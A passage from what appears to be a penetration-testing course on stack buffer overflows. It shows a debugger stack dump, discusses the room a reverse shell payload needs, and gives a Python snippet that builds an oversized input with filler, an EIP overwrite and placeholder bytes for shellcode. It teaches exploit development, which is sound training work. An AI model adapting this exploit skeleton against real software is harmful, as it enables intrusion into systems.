![](bbox=[0.12, 0.03, 0.25, 0.09])

Closer inspection of the stack at crash time (Listing 351) reveals that the first four C’s from our buffer landed at address 0x01307460, and ESP storing 0x01307464 (Figure 215) points to the next four C’s from our buffer:

| 01307444 | 41414141 | AAAA |
| 01307448 | 41414141 | AAAA |
| 0130744C | 41414141 | AAAA |
| 01307450 | 41414141 | AAAA |
| 01307454 | 41414141 | AAAA |
| 01307458 | 41414141 | AAAA |
| 0130745C | 42424242 | BBBB |
| 01307460 | 43434343 | CCCC |
| 01307464 | 43434343 | CCCC |
| 01307468 | 43434343 | CCCC |
| 0130746C | 43434343 | CCCC |
| 01307470 | 00000000 | |
| 01307474 | 00000000 | |

*Listing 351 - ESP points into C’s*

From experience, we know that a standard reverse shell payload requires approximately 350–400 bytes of space. However, the listing above clearly shows that there are only sixteen C’s in the buffer, which isn’t nearly enough space for our shellcode. The simplest way around this problem is to try to increase the buffer length in our exploit from 800 bytes to 1500 bytes and see if this allows enough space for our shellcode without breaking the buffer overflow condition or changing the nature of the crash.

> Depending on the application and the type of vulnerability, there may be restrictions on the length of our input. In some cases, increasing the length of a buffer may result in a completely different crash since the larger buffer overwrites additional data on the stack that is used by the target application.

For this update, we will add ‘D’ characters as a placeholder for our shellcode:

```
```
...
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
...
```
*Listing 352 - Updated username string*
```

Once the new, longer buffer is sent, a similar crash can be observed in the debugger. This time, however, we find ESP pointing to a different address value, 0x030E745C as shown in Figure 216: